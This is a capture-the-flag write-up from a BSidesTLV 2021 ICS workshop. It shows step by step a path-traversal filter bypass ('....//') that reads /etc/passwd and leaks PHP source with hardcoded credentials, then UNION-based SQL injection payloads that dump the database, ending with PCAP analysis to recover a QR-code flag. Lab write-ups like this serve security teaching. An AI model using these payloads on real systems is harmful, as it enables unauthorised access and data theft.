# GE Digital CTF

## Introduction

During BSidesTLV 2021, GE Digital hosted an Introduction to Industrial Control Systems workshop. This short CTF was part of the workshop.

## The CTF

We are presented with the following entry page:

```html
    <header class="st-header st-fullHeight">
      <div class="header-overlay"></div><!-- /HEADER OVERLY -->
      <div class="container">
        <div class="row">
          <div class="col-md-12 text-center st-header-content">
            <div class="logo">
              <span>GE DIGITAL</span>
              <!-- <img src="images/logo.svg" alt=""> -->
            </div>
            <div class="st-header-title">
              <h2>Welcome to <span>GE CTF Challange</span></h2>
              <p>We welcome you to solve our mystery, This is a classic CTF challenge. Enjoy your resource.</p>
            </div>
          </div>
        </div>

        <div class="row">
          <div class="col-md-6 text-right">
            <a class="btn btn-primary btn-lg btn-block" href="login.php">Login</a>
          </div>
          <div class="col-md-6 text-right ">
            <a class="btn btn-success btn-lg btn-block" href="status.php?r=health.txt">Check System Status</a>
          </div>
        </div>  
      </div>

      <a href="#service" class="mouse-icon hidden-xs">
        <div class="wheel"></div>
      </a>
    </header>
```

As we can see, we have a link to a login page and a link to a "check system status" page. We'll start from checking the system status since the URL is just screaming "directory traversal".

By default, we get the following response:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl 'https://www.gechallenge.com/ge-ctf/status.php?r=health.txt' -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba' 
OK 
```

Let's start playing with the `r` parameter in order to read different files:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl 'https://www.gechallenge.com/ge-ctf/status.php?r=/etc/passwd' -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba'
./system_status//etc/passwd Not found 
```

Looks like the parameter values is being appended as a relative path. We can use `../` to start climbing up the directory tree until we get to the root:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl 'https://www.gechallenge.com/ge-ctf/status.php?r=../etc/passwd' -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba'
./system_status/etc/passwd Not found                                                                                    
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl 'https://www.gechallenge.com/ge-ctf/status.php?r=../../etc/passwd' -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba'
./system_status/etc/passwd Not found
```

Our `../` additions are not being reflected in the outcome. Maybe there is some basic sanitization of the path. The most basic form is to replace `../` with an empty string. That's bypassed by providing `....//` instead:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl 'https://www.gechallenge.com/ge-ctf/status.php?r=....//etc/passwd' -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba'
./system_status/../etc/passwd Not found
```

Good, looks like it's working. We continue up:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl 'https://www.gechallenge.com/ge-ctf/status.php?r=....//....//etc/passwd' -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba'
./system_status/../../etc/passwd Not found

┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl 'https://gechallenge.com/ge-ctf/status.php?r=....//....//....//....//....//etc/passwd' -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:120:MySQL Server,,,:/nonexistent:/bin/false
dudu:x:1001:1001:Dudu,,,:/home/dudu:/bin/bash
new_user:x:1002:1002::/home/new_user:/bin/bash
amit:x:1003:1003:Amit,,,:/home/amit:/bin/bash

```

Ok, we've proven that the code is vulnerable, now let's find some interesting files.

We'll start with `login.php`:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl 'https://gechallenge.com/ge-ctf/status.php?r=....//login.php' -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba'
```

We get:

```php

<?php

    include './handlers/ctf-headers.php';
    include './handlers/auth.php';
    //include './handlers/redirect.php';

?>


<?php

    //reset auth
    reset_user_auth();

    $has_validation_error = false;
    //check login
    if(isset($_POST["u"])){
        if(isset($_POST["p"])){
            $usr = $_POST["u"];
            $pwd = $_POST["p"];

            if ($usr === 'CTFAdmin@ge.com' && $pwd === 'P4ssW0rD1337!'){
                //set user auth for login
                set_user_auth($usr);

                // echo 'Great you logged into the system!';
                Redirect('manage.php');
            }else{
                $has_validation_error = true;
            }
        }
    }
?>



<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">

    <!-- Main CSS file -->
    <link rel="stylesheet" href="css/style.css" />
    <!-- Bootstrap CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet" >

    <title>GE CTF - Login</title>
  </head>
  <body>


    <!-- HEADER -->
    <header class="login-header st-fullHeight">
      <div class="header-overlay"></div><!-- /HEADER OVERLY -->

      <div class="container">
        <div class="row">
          <div class="col-md-12 text-center st-header-content">
            <div class="logo">
              <svg version="1.2" baseProfile="tiny" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 72 72" overflow="visible"><path fill-rule="evenodd" fill="#FFFFFE" d="M29.8 38.7c-4.5 2.2-10.2 6.1-10.2 10.4 0 1.6.8 2.6 2.3 2.6 4.4-.1 7.1-7 7.9-13zM31 20c0-.5-.3-.7-.7-.7-2.1 0-5.1 5.5-5.1 8.8 3.3-1.8 5.8-5.9 5.8-8.1zm17.7.4c0-.5-.1-1.1-.7-1.1-1.5 0-3.9 3.2-3.9 7.3 3-2.6 4.6-4.8 4.6-6.2zM56 45.6c0 4.5-3.9 9.2-9.6 9.2-6.9 0-10.4-5.8-10.4-11 0-7.3 5-10.4 7.1-11.5-.4-.3-.7-.7-1-1.2-2.4 1.7-4.6 3.2-9.2 5.8-.2 3.2-.5 6.7-1.3 9.1-1.7 5.1-5.2 8.8-9.8 8.8-3.9 0-5.8-2.8-5.8-5.8 0-2.2 1.3-5 3.6-7.1 2.9-2.6 6.1-4.2 10.5-6.5.1-.6.2-1.2.3-1.9-1.1 1-2.7 1.4-4 1.4-2.1 0-3.8-1.8-4.2-3.7-2.8-.2-4.9-2.2-5-5.4 0-2.3.9-4.3 2.4-4.3.6 0 .8.5.8.9s-.5 1.7-.5 3 .6 3 2.2 3c0-5.2 3.8-11.9 8.3-11.9 3 0 3.4 2.2 3.4 3.2 0 4.7-4.7 9.9-8.5 11.2.1.4.5 1.5 1.7 1.5 1.5 0 3.3-1.4 4.2-2.5.4-2.1 1.9-5.1 3.9-5.1.8 0 1.2.6 1.2 1.3 0 1.5-1.6 3.4-2.8 4.7-.2 1-.3 2.1-.3 3 3.5-2.1 5.3-3.2 7.9-5.1-.1-.7-.1-1.5-.1-2.3 0-4.7 3.1-9.9 7.2-9.9 2.3 0 3.5 1.6 3.5 3.4 0 3.4-2.9 6.4-7 9.5.3.8.8 1.5 1.6 1.9.1-.2 1.4-.4 2.5-.4 1.2 0 2.9.3 2.9 1.5 0 1.4-1.9 1.7-3.4 1.7-.8.1-2.1-.2-2.1-.2-2.2.6-6.4 3.1-6.4 9.5 0 4.3 2.7 8.3 6.9 8.3 3.2 0 5.8-2.4 5.9-6.1 0-2.4-1-4.9-3.4-4.9-1.2 0-2.3.9-2.3 2.2-.1 2 1.4 2.2 1.4 3.5 0 .9-.7 1.3-1.4 1.3-2 0-3.5-2-3.5-4.5 0-3 2.6-5.5 6-5.5 4.3 0 6.6 3.8 6.6 7.9zM68.1 36c0-11.4-5.8-23.2-18.3-26.9-2.6-.8-4.8-1.3-7.3-1.3-5.8 0-6 3.3-8.7 3.3-1.5 0-2.5-1.1-2.5-2.4 0-2.3 2.7-4.1 7-4.1 4 0 7.1 1 7.7 1.3l.1-.3c-1-.4-4.8-1.7-10.1-1.7-11.5 0-23.2 5.9-26.9 18.3-.8 2.6-1.3 4.8-1.3 7.3 0 5.8 3.3 6.1 3.3 8.8 0 1.4-1.1 2.4-2.4 2.4-2.3 0-4.1-2.6-4.1-7 0-4 1-7.1 1.2-7.7l-.3-.1C5.2 27 3.9 30.7 3.9 36c0 11.6 5.9 23.2 18.3 27 2.6.8 4.8 1.3 7.3 1.3 5.8 0 6-3.4 8.7-3.4 1.4 0 2.5 1.1 2.5 2.5 0 2.2-2.6 4-7 4-4 0-7.2-1-7.7-1.2l-.1.3c1.1.5 4.9 1.6 10.2 1.6 11.5 0 23.2-5.8 26.9-18.3.8-2.5 1.3-4.8 1.3-7.2 0-5.9-3.3-6.1-3.3-8.8 0-1.5 1-2.5 2.4-2.5 2.3 0 4.1 2.7 4.1 7.1 0 3.9-1 7-1.2 7.7l.3.1c.3-1.1 1.5-4.8 1.5-10.2zm2.2 0C70.3 54.9 55 70.3 36 70.3 17 70.3 1.7 54.9 1.7 36 1.7 17 17 1.7 36 1.7c18.9 0 34.3 15.5 34.3 34.3zm1.7 0C72 16.2 55.8 0 36 0S0 16.2 0 36c0 19.9 16.2 36 36 36s36-16.1 36-36z"></path></svg>
              <span>GE DIGITAL</span>
              <!-- <img src="images/logo.svg" alt=""> -->
            </div>
          </div>
        </div>



      <div class="row">
        <div class="col-md-offset-3 col-md-6 text-center login-header-form">
            <div class="st-header-title">
              <h2><span>Login</span></h2>
            </div>
            <form class="form" method="POST">
                <?php
                    if($has_validation_error){
                        echo    '<div class="form-group">
                                    <div class="alert alert-danger" role="alert">
                                        You entered wrong username or password
                                    </div>
                                </div>';
                    }
                ?>

                <div class="form-group">
                    <input type="email" id="txt_email" class="form-control form-control-lg" aria-describedby="emailHelp" placeholder="Enter email" name="u">
                </div>
                <div class="form-group">
                    <input type="password" id="txt_pass" class="form-control form-control-lg" placeholder="Password" maxlength="20" name="p">
                </div>

                <input type="submit" class="btn btn-lgbtn-primary"/>
            </form>

        </div>
      </div>
    </div>

    </header>
    <!-- /HEADER -->


    <!-- JS -->
    <script type="text/javascript" src="js/jquery.min.js"></script><!-- jQuery -->
    <script type="text/javascript" src="js/bootstrap.min.js"></script><!-- Bootstrap -->
    <script type="text/javascript" src="js/jquery.parallax.js"></script><!-- Parallax -->
    <script type="text/javascript" src="js/smoothscroll.js"></script><!-- Smooth Scroll -->
    <script type="text/javascript" src="js/scripts.js"></script><!-- Scripts -->
  </body>
</html>
```


The important part is here:

```php
if ($usr === 'CTFAdmin@ge.com' && $pwd === 'P4ssW0rD1337!'){
    //set user auth for login
    set_user_auth($usr);

    // echo 'Great you logged into the system!';
    Redirect('manage.php');
}else{
    $has_validation_error = true;
}
```

First, we get the credentials for logging into the system. Then, we know that the user is transferred to `manage.php`.

After logging in, we arrive to the management page which contains a simple table:

```html
<table class="table">
    <thead>
        <tr>
            <td >id</td>
            <td>name</td>
            <td>description</td>
            <td>status</td>
        </tr> 
    </thead>
    <tbody>

    
            <tr>
            <td> 1</td>
            <td> Sensor 1</td>
            <td> Vision and Imaging Sensors</td>
            <td> 1</td>
            </div>
            <tr>
            <td> 2</td>
            <td> Sensor 2</td>
            <td> Temperature Sensors</td>
            <td> 1</td>
            </div>
            <tr>
            <td> 3</td>
            <td> Sensor 3</td>
            <td> Radiation Sensors</td>
            <td> 1</td>
            </div>          </tbody>

</table>
```

By using the vulnerability above, we can leak the source code:

```php
<?php  
  include './handlers/ctf-headers.php';

  include './handlers/auth.php';
  include './handlers/db-connection.php';
  
  check_is_user_auth();
?>

<?php
  if(isset($_GET["sname"])){
   
   
    $sname = $_GET["sname"];

    // $sname
    $sql = "SELECT * FROM `ge_sensors` where `name` like '%$sname%'";

//echo $sql;

  }else{
    $sql = "SELECT * FROM ge_sensors";
  }
  //set results
  $result = $conn->query($sql);
?>





<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    
    <!-- Main CSS file -->
    <link rel="stylesheet" href="css/style.css" />
    <!-- Bootstrap CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet" >
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

    <title>GE CTF - Managment - Sensors List</title>
  </head>
  <body>
    
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1>Managment - Sensors List</h1>
            </div>
            <div class="row">
              <div class="col-md-12">
                <div class="border p-4 mb-4 d-flex align-items-center flex-column">
                  <form  class="form">
                    <div class="input-group">
                          <div class="form-outline">
                            <input id="search-input" type="search" class="form-control" name="sname" placeholder="Search Name"/>
                            <button id="search-button" type="submit" class="btn btn-primary">
                              <i class="fas fa-search"></i>
                            </button>
                          </div>
                         
                        </div>
                    </div>
                  </form>
                </div>
          </div>  
        </div>  

      <div class="row">
        <div class="col-md-12">
          
        </div>
        <div class="col-md-12">
        <table class="table">
            <thead>
              <tr>
                  <td >id</td>
                  <td>name</td>
                  <td>description</td>
                  <td>status</td>
              </tr> 
            </thead>
            <tbody>

            <?php 
            //Print results
            if($result){
              if ($result->num_rows > 0) {
                // output data of each row
                while($row = $result->fetch_assoc()) {
                  $id = htmlspecialchars($row['id'],ENT_QUOTES);
                  $name = htmlspecialchars($row['name'],ENT_QUOTES);
                  $description = htmlspecialchars($row['description']);
                  $status = htmlspecialchars($row['status'],ENT_QUOTES);
                  echo "
                  <tr>
                    <td> $id</td>
                    <td> $name</td>
                    <td> $description</td>
                    <td> $status</td>
                  </div>";
  
                }
              } else {
                echo "0 Results";
              }
            }
            $conn->close();
          ?>
          </tbody>

        </table>


        </div>
      </div>  
    </div>

    <!-- JS -->
    <script type="text/javascript" src="js/jquery.min.js"></script><!-- jQuery -->
    <script type="text/javascript" src="js/bootstrap.min.js"></script><!-- Bootstrap -->
    <script type="text/javascript" src="js/jquery.parallax.js"></script><!-- Parallax -->
    <script type="text/javascript" src="js/smoothscroll.js"></script><!-- Smooth Scroll -->
    <script type="text/javascript" src="js/scripts.js"></script><!-- Scripts -->

  </body>
</html>

```

There's a pretty obvious SQL injection here:

```sql
$sql = "SELECT * FROM `ge_sensors` where `name` like '%$sname%'";
```

Let's create a small PoC by visiting `manage.php?sname=' and '1'='1' union select 1,2,3,4 from ge_sensors where '1' like '1`, to receive:

```html
<table class="table">
    <thead>
        <tr>
            <td >id</td>
            <td>name</td>
            <td>description</td>
            <td>status</td>
        </tr>
    </thead>
    <tbody>


            <tr>
            <td> 1</td>
            <td> Sensor 1</td>
            <td> Vision and Imaging Sensors</td>
            <td> 1</td>
            </div>
            <tr>
            <td> 2</td>
            <td> Sensor 2</td>
            <td> Temperature Sensors</td>
            <td> 1</td>
            </div>
            <tr>
            <td> 3</td>
            <td> Sensor 3</td>
            <td> Radiation Sensors</td>
            <td> 1</td>
            </div>
            <tr>
            <td> 1</td>
            <td> 2</td>
            <td> 3</td>
            <td> 4</td>
            </div>          </tbody>

</table>
```


Now that we know it works, we can start to dump the database structure. We visit `manage.php?sname=' and '1'='1' union select 1,2,group_concat(schema_name),4 from information_schema.schemata where '1' like '1` and get the schema names: `information_schema,ge_ctf`. We visit `manage.php?sname=' and '1'='1' union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema like 'ge_ctf` and get the table names: `ge_files,ge_sensors`. We visit `manage.php?sname=' and '1'='1' union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name like 'ge_file` to get the column names for `ge_files`, and get: `name`. Finally, we dump the table: `manage.php?sname=' and '1'='1' union select 1,2,group_concat(name),4 from ge_files where '1' like '1` which results in `/var/www/html/index.php,/var/www/html/login.php,/var/www/html/status.php,/var/www/html/manage.php,/var/www/html/system_status/health.txt,/PLC-traffic-test.pcap`.

The PCAP file looks interesting, let's get it:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ curl "https://gechallenge.com/ge-ctf/status.php?r=....//....//....//....//....//PLC-traffic-test.pcap" -H 'Cookie: PHPSESSID=55j449qcdas6qlb8a9g73i1bba' -s -o PLC-traffic-test.pcap

┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ file PLC-traffic-test.pcap
PLC-traffic-test.pcap: pcapng capture file - version 1.0
```

Let's check what we see there:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ tshark -qz io,phs -r PLC-traffic-test.pcap

===================================================================
Protocol Hierarchy Statistics
Filter:

eth                                      frames:365 bytes:145581
  ipv6                                   frames:35 bytes:3280
    icmpv6                               frames:30 bytes:2580
    udp                                  frames:5 bytes:700
      mdns                               frames:3 bytes:450
      dhcpv6                             frames:2 bytes:250
  ip                                     frames:308 bytes:141107
    udp                                  frames:46 bytes:5324
      dns                                frames:28 bytes:2538
      mdns                               frames:14 bytes:1918
      ssdp                               frames:4 bytes:868
    tcp                                  frames:258 bytes:135543
      http                               frames:8 bytes:6346
        data-text-lines                  frames:2 bytes:1178
        png                              frames:1 bytes:3809
          tcp.segments                   frames:1 bytes:3809
      tls                                frames:91 bytes:96767
        tcp.segments                     frames:32 bytes:45812
          tls                            frames:26 bytes:37895
    igmp                                 frames:4 bytes:240
  arp                                    frames:22 bytes:1194
===================================================================
```

The things that jump to the eye are the HTTP requests and the PNG file. We'll start with the HTTP request:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ tshark -nr PLC-traffic-test.pcap -Y 'http'
    9 0.630578364 192.168.1.30 → 142.250.186.174 HTTP 140 GET / HTTP/1.1
   11 0.708023209 142.250.186.174 → 192.168.1.30 HTTP 594 HTTP/1.1 301 Moved Permanently  (text/html)
   86 37.915692649 192.168.1.30 → 172.67.178.63 HTTP 131 GET / HTTP/1.1
   88 37.998487691 172.67.178.63 → 192.168.1.30 HTTP 788 HTTP/1.1 301 Moved Permanently
  121 77.359704534 192.168.1.30 → 18.192.24.246 HTTP 145 GET / HTTP/1.1
  123 77.428334918 18.192.24.246 → 192.168.1.30 HTTP 584 HTTP/1.1 301 Moved Permanently  (text/html)
  191 116.454603923 192.168.1.30 → 192.168.1.77 HTTP 155 GET /FLAG.png HTTP/1.1
  209 116.458045593 192.168.1.77 → 192.168.1.30 HTTP 3809 HTTP/1.0 200 OK  (PNG)
```

We see that the request is for `FLAG.png`, let's dump the file:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ tshark -r PLC-traffic-test.pcap -o "tcp.desegment_tcp_streams: TRUE" -o "tcp.no_subdissector_on_error: FALSE" --export-objects "http,exported_objects" | grep png
  191 116.454603923 192.168.1.30 → 192.168.1.77 HTTP 155 GET /FLAG.png HTTP/1.1

┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ file exported_objects/FLAG.png
exported_objects/FLAG.png: PNG image data, 660 x 273, 8-bit/color RGBA, non-interlaced
```

The image has a QR code:

```console
┌──(user@kali)-[/media/sf_CTFs/ge]
└─$ zbarimg exported_objects/FLAG.png
QR-Code:https://gechallenge.com/Go0d_JoB_GE-D1GIT4L.html
scanned 1 barcode symbols from 1 images in 0.04 seconds
```

And we're done.